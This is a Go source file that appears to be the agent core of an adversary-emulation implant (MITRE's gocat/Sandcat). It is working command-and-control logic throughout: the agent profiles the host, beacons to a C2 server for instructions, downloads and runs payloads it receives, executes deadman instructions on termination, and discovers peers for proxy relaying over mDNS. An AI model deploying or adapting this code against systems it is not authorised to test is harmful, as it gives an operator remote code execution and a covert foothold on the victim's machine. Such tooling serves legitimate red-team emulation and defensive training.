package agent

import (
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"reflect"
	"runtime"
	"sync"
	"time"
	"context"
	"strings"

	"github.com/mitre/gocat/contact"
	"github.com/mitre/gocat/execute"
	"github.com/mitre/gocat/output"
	"github.com/mitre/gocat/privdetect"
	"github.com/mitre/gocat/proxy"
	"github.com/grandcat/zeroconf"
)

var beaconFailureThreshold = 3

type AgentInterface interface {
	Heartbeat()
	Beacon() map[string]interface{}
	Initialize(server string, group string, c2Config map[string]string, enableLocalP2pReceivers bool) error
	RunInstruction(command map[string]interface{}, payloads []string, submitResults bool)
	Terminate()
	GetFullProfile() map[string]interface{}
	GetTrimmedProfile() map[string]interface{}
	SetCommunicationChannels(c2Config map[string]string) error
	SetPaw(paw string)
	Display()
	DownloadPayloads(payloads []interface{}) []string
	FetchPayloadBytes(payload string) []byte
	ActivateLocalP2pReceivers()
	TerminateLocalP2pReceivers()
	HandleBeaconFailure() error
	DiscoverPeers()
	AttemptSelectComChannel(requestedChannelConfig map[string]string, requestedChannel string) error
}

// Implements AgentInterface
type Agent struct {
	// Profile fields
	server string
	group string
	host string
	username string
	architecture string
	platform string
	location string
	pid int
	ppid int
	executors []string
	privilege string
	exe_name string
	paw string
	initialDelay float64
	originLinkID int

	// Communication methods
	beaconContact contact.Contact
	heartbeatContact contact.Contact
	failedBeaconCounter int

	// peer-to-peer info
	enableLocalP2pReceivers bool
	p2pReceiverWaitGroup *sync.WaitGroup
	localP2pReceivers map[string]proxy.P2pReceiver // maps P2P protocol to receiver running on this machine
	localP2pReceiverAddresses map[string][]string // maps P2P protocol to receiver addresses listening on this machine
	availablePeerReceivers map[string][]string // maps P2P protocol to receiver addresses running on peer machines
	exhaustedPeerReceivers map[string][]string // maps P2P protocol to receiver addresses that the agent has tried using.
	usingPeerReceivers bool // True if connecting to C2 via proxy peer

	// Deadman instructions to run before termination. Will be list of instruction mappings.
	deadmanInstructions []map[string]interface{}
}

// Set up agent variables.
func (a *Agent) Initialize(server string, group string, c2Config map[string]string, enableLocalP2pReceivers bool, initialDelay int, paw string, originLinkID int) error {
	host, err := os.Hostname()
	if err != nil {
		return err
	}
	if userName, err := getUsername(); err == nil {
		a.username = userName
	} else {
		return err
	}
	a.server = server
	a.group = group
	a.host = host
	a.architecture = runtime.GOARCH
	a.platform = runtime.GOOS
	a.location = os.Args[0]
	a.pid = os.Getpid()
	a.ppid = os.Getppid()
	a.executors = execute.AvailableExecutors()
	a.privilege = privdetect.Privlevel()
	a.exe_name = filepath.Base(os.Args[0])
	a.initialDelay = float64(initialDelay)
	a.failedBeaconCounter = 0
	a.originLinkID = originLinkID

	// Paw will get initialized after successful beacon if it's not specified via command line
	if paw != "" {
		a.paw = paw
	}

	// Load peer proxy receiver information
	a.exhaustedPeerReceivers = make(map[string][]string)
	a.usingPeerReceivers = false
	a.availablePeerReceivers, err = proxy.GetAvailablePeerReceivers()
	if err != nil {
		return err
	}
	a.DiscoverPeers()

	// Set up contacts
	if err = a.SetCommunicationChannels(c2Config); err != nil {
		return err
	}

	// Set up P2P receivers.
	a.enableLocalP2pReceivers = enableLocalP2pReceivers
	if a.enableLocalP2pReceivers {
		a.localP2pReceivers = make(map[string]proxy.P2pReceiver)
		a.localP2pReceiverAddresses = make(map[string][]string)
		a.p2pReceiverWaitGroup = &sync.WaitGroup{}
		a.ActivateLocalP2pReceivers()
	}
	return nil
}

// Returns full profile for agent.
func (a *Agent) GetFullProfile() map[string]interface{} {
	return map[string]interface{}{
		"paw": a.paw,
		"server": a.server,
		"group": a.group,
		"host": a.host,
		"contact": a.beaconContact.GetName(),
		"username": a.username,
		"architecture": a.architecture,
		"platform": a.platform,
		"location": a.location,
		"pid": a.pid,
		"ppid": a.ppid,
		"executors": a.executors,
		"privilege": a.privilege,
		"exe_name": a.exe_name,
		"proxy_receivers": a.localP2pReceiverAddresses,
		"origin_link_id": a.originLinkID,
		"deadman_enabled": true,
		"available_contacts": contact.GetAvailableCommChannels(),
	}
}

// Return minimal subset of agent profile.
func (a *Agent) GetTrimmedProfile() map[string]interface{} {
	return map[string]interface{}{
		"paw": a.paw,
		"server": a.server,
		"platform": a.platform,
		"host": a.host,
		"contact": a.beaconContact.GetName(),
	}
}

// Pings C2 for instructions and returns them.
func (a *Agent) Beacon() map[string]interface{} {
	var beacon map[string]interface{}
	profile := a.GetFullProfile()
	response := a.beaconContact.GetBeaconBytes(profile)
	if response != nil {
		beacon = processBeacon(response)
	} else {
		output.VerbosePrint("[-] beacon: DEAD")
	}
	return beacon
}

// Converts the given data into a beacon with instructions.
func processBeacon(data []byte) map[string]interface{} {
	var beacon map[string]interface{}
	if err := json.Unmarshal(data, &beacon); err != nil {
		output.VerbosePrint(fmt.Sprintf("[-] Malformed beacon received: %s", err.Error()))
	} else {
		var commands interface{}
		if err := json.Unmarshal([]byte(beacon["instructions"].(string)), &commands); err != nil {
			output.VerbosePrint(fmt.Sprintf("[-] Malformed beacon instructions received: %s", err.Error()))
		} else {
			output.VerbosePrint("[+] beacon: ALIVE")
			beacon["sleep"] = int(beacon["sleep"].(float64))
			beacon["watchdog"] = int(beacon["watchdog"].(float64))
			beacon["instructions"] = commands
		}
	}
	return beacon
}

// If too many consecutive failures occur for the current communication method, switch to a new proxy method.
// Return an error if switch fails.
func (a *Agent) HandleBeaconFailure() error {
	a.failedBeaconCounter += 1
	if a.failedBeaconCounter >= beaconFailureThreshold {
		// Reset counter and try switching proxy methods
		a.failedBeaconCounter = 0
		output.VerbosePrint("[!] Reached beacon failure threshold. Attempting to switch to new peer proxy method.")
		return a.findAvailablePeerProxyClient()
	}
	return nil
}

func (a *Agent) Heartbeat() {
	// Add any heartbeat functionality here.
}

func (a *Agent) Terminate() {
	// Add any cleanup/termination functionality here.
	output.VerbosePrint("[*] Beginning agent termination.")
	if a.enableLocalP2pReceivers {
		a.TerminateLocalP2pReceivers()
	}

	// Run deadman instructions prior to termination
	a.ExecuteDeadmanInstructions()
	output.VerbosePrint("[*] Terminating Sandcat Agent... goodbye.")
}

// Runs a single instruction and send results.
func (a *Agent) RunInstruction(instruction map[string]interface{}, payloads []string, submitResults bool) {
	result := make(map[string]interface{})
	info := execute.InstructionInfo{
		Profile: a.GetTrimmedProfile(),
		Instruction: instruction,
	}
	commandOutput, status, pid := execute.RunCommand(info, payloads)
	for _, payloadPath := range payloads {
		err := os.Remove(payloadPath)
		if err != nil {
			output.VerbosePrint("[!] Failed to delete payload: " + payloadPath)
		}
	}
	if submitResults {
		result["id"] = instruction["id"]
		result["output"] = commandOutput
		result["status"] = status
		result["pid"] = pid
		a.beaconContact.SendExecutionResults(a.GetTrimmedProfile(), result)
	}
}

// Sets the communication channels for the agent according to the specified channel configuration map.
// Will resort to peer-to-peer if agent doesn't support the requested channel or if the C2's requirements
// are not met. If the original requested channel cannot be used and there are no compatible peer proxy receivers,
// then an error will be returned.
// This method does not test connectivity to the requested server or to proxy receivers.
func (a *Agent) SetCommunicationChannels(requestedChannelConfig map[string]string) error {
	if len(contact.CommunicationChannels) > 0 {
		if requestedChannel, ok := requestedChannelConfig["c2Name"]; ok {
			if err := a.AttemptSelectComChannel(requestedChannelConfig, requestedChannel); err == nil {
				return nil
			}
		}
		// Original requested channel not found. See if we can use any available peer-to-peer-proxy receivers.
		output.VerbosePrint("[!] Requested communication channel not valid or available. Resorting to peer-to-peer.")
		return a.findAvailablePeerProxyClient()
	}
	return errors.New("No possible C2 communication channels found.")
}

// Attempts to set a given communication channel for the agent.
func (a *Agent) AttemptSelectComChannel(requestedChannelConfig map[string]string, requestedChannel string) error {
	coms, ok := contact.CommunicationChannels[requestedChannel]
	output.VerbosePrint(fmt.Sprintf("[*] Attempting to set channel %s", requestedChannel))
	if !ok {
		return errors.New(fmt.Sprintf("%s channel not available", requestedChannel))
	}
	a.updateUpstreamComs(coms)
	valid, config := coms.C2RequirementsMet(a.GetFullProfile(), requestedChannelConfig)
	if valid {
		if config != nil {
			a.modifyAgentConfiguration(config)
		}
		output.VerbosePrint(fmt.Sprintf("[*] Set communication channel to %s", requestedChannel))
		return nil
	}
	return errors.New(fmt.Sprintf("%s channel available, but requirements not met.", requestedChannel))
}

// Outputs information about the agent.
func (a *Agent) Display() {
	output.VerbosePrint(fmt.Sprintf("initial delay=%d", int(a.initialDelay)))
	output.VerbosePrint(fmt.Sprintf("server=%s", a.server))
	output.VerbosePrint(fmt.Sprintf("group=%s", a.group))
	output.VerbosePrint(fmt.Sprintf("privilege=%s", a.privilege))
	output.VerbosePrint(fmt.Sprintf("allow local p2p receivers=%v", a.enableLocalP2pReceivers))
	output.VerbosePrint(fmt.Sprintf("beacon channel=%s", a.beaconContact.GetName()))
	output.VerbosePrint(fmt.Sprintf("heartbeat channel=%s", a.heartbeatContact.GetName()))
	if a.enableLocalP2pReceivers {
		a.displayLocalReceiverInformation()
	}
}

func (a *Agent) displayLocalReceiverInformation() {
	for receiverName, _ := range proxy.P2pReceiverChannels {
		if _, ok := a.localP2pReceivers[receiverName]; ok {
			output.VerbosePrint(fmt.Sprintf("P2p receiver %s=activated", receiverName))
		} else {
			output.VerbosePrint(fmt.Sprintf("P2p receiver %s=NOT activated", receiverName))
		}
	}
	for protocol, addressList := range a.localP2pReceiverAddresses {
		for _, address := range addressList {
			output.VerbosePrint(fmt.Sprintf("%s local proxy receiver available at %s", protocol, address))
		}
	}
}

// Will download each individual payload listed, write them to disk,
// and will return the full file paths of each downloaded payload.
func (a *Agent) DownloadPayloads(payloads []interface{}) []string {
	var droppedPayloads []string
	availablePayloads := reflect.ValueOf(payloads)
	for i := 0; i < availablePayloads.Len(); i++ {
		payload := availablePayloads.Index(i).Elem().String()
		location, err := a.WritePayloadToDisk(payload)
		if err != nil {
			output.VerbosePrint(fmt.Sprintf("[-] %s", err.Error()))
			continue
		}
		droppedPayloads = append(droppedPayloads, location)
	}
	return droppedPayloads
}

// Will download the specified payload and write it to disk using the filename provided by the C2.
// Returns the C2-provided filename or error.
func (a *Agent) WritePayloadToDisk(payload string) (string, error) {
	payloadBytes, filename := a.FetchPayloadBytes(payload)
	if len(payloadBytes) > 0 && len(filename) > 0 {
		location := filepath.Join(filename)
		if !fileExists(location) {
			return location, writePayloadBytes(location, payloadBytes)
		}
		output.VerbosePrint(fmt.Sprintf("[*] File %s already exists", filename))
		return location, nil
	}
	return "", errors.New(fmt.Sprintf("Failed to fetch payload bytes for payload %s",payload))
}

// Will request payload bytes from the C2 for the specified payload and return them.
func (a *Agent) FetchPayloadBytes(payload string) ([]byte, string) {
	output.VerbosePrint(fmt.Sprintf("[*] Fetching new payload bytes: %s", payload))
	return a.beaconContact.GetPayloadBytes(a.GetTrimmedProfile(), payload)
}

func (a *Agent) Sleep(sleepTime float64) {
	time.Sleep(time.Duration(sleepTime) * time.Second)
}

func (a *Agent) GetPaw() string {
	return a.paw
}

func (a *Agent) SetPaw(paw string) {
	if len(paw) > 0 {
		a.paw = paw
		if a.enableLocalP2pReceivers {
			for _, receiver := range a.localP2pReceivers {
				receiver.UpdateAgentPaw(paw)
			}
		}
	}
}

func (a *Agent) GetBeaconContact() contact.Contact {
	return a.beaconContact
}

func (a *Agent) GetHeartbeatContact() contact.Contact {
	return a.heartbeatContact
}

func (a *Agent) StoreDeadmanInstruction(instruction map[string]interface{}) {
	a.deadmanInstructions = append(a.deadmanInstructions, instruction)
}

func (a *Agent) ExecuteDeadmanInstructions() {
	for _, instruction := range a.deadmanInstructions {
		output.VerbosePrint(fmt.Sprintf("[*] Running deadman instruction %s", instruction["id"]))
		droppedPayloads := a.DownloadPayloads(instruction["payloads"].([]interface{}))
		a.RunInstruction(instruction, droppedPayloads, false)
	}
}

func (a *Agent) modifyAgentConfiguration(config map[string]string) {
	if val, ok := config["paw"]; ok {
		a.SetPaw(val)
	}
}

func (a *Agent) updateUpstreamServer(newServer string) {
	a.server = newServer
	if a.localP2pReceivers != nil {
		for _, receiver := range a.localP2pReceivers {
			receiver.UpdateUpstreamServer(newServer)
		}
	}
}

func (a *Agent) updateUpstreamComs(newComs contact.Contact) {
	a.beaconContact = newComs
	a.heartbeatContact = newComs
	if a.localP2pReceivers != nil {
		for _, receiver := range a.localP2pReceivers {
			receiver.UpdateUpstreamComs(newComs)
		}
	}
}

func (a *Agent) evaluateNewPeers(results <- chan *zeroconf.ServiceEntry) {
    for entry := range results {
        for _, ip := range entry.AddrIPv4 {
            a.mergeNewPeers(entry.Text[0], fmt.Sprintf("%s:%d", ip, entry.Port))
        }
    }
}

func (a *Agent) mergeNewPeers(proxyChannel string, ipPort string) {
    peer := fmt.Sprintf("%s://%s", strings.ToLower(proxyChannel), ipPort)
    allPeers := append(a.availablePeerReceivers[proxyChannel], a.exhaustedPeerReceivers[proxyChannel]...)
    for _, existingPeer := range allPeers {
        if peer == existingPeer {
            return
        }
    }
    for protocol, addressList := range a.localP2pReceiverAddresses {
        if proxyChannel == protocol {
            for _, address := range addressList {
                if peer == address {
                    return
                }
            }
		}
	}
    a.availablePeerReceivers[proxyChannel] = append(a.availablePeerReceivers[proxyChannel], peer)
    output.VerbosePrint(fmt.Sprintf("[*] new peer added: %s", peer))
}

func (a *Agent) DiscoverPeers() {
    // Discover all services on the network (e.g. _workstation._tcp)
    resolver, err := zeroconf.NewResolver(nil)
    if err != nil {
        output.VerbosePrint(fmt.Sprintf("[-] Failed to initialize zeroconf resolver: %s", err.Error()))
    }

    entries := make(chan *zeroconf.ServiceEntry)
    go a.evaluateNewPeers(entries)

    ctx, cancel := context.WithTimeout(context.Background(), time.Second*1)
    defer cancel()
    err = resolver.Browse(ctx, "_service._comms", "local.", entries)
    if err != nil {
         output.VerbosePrint(fmt.Sprintf("[-] Failed to browse for peers: %s", err.Error()))
    }

    <-ctx.Done()
}
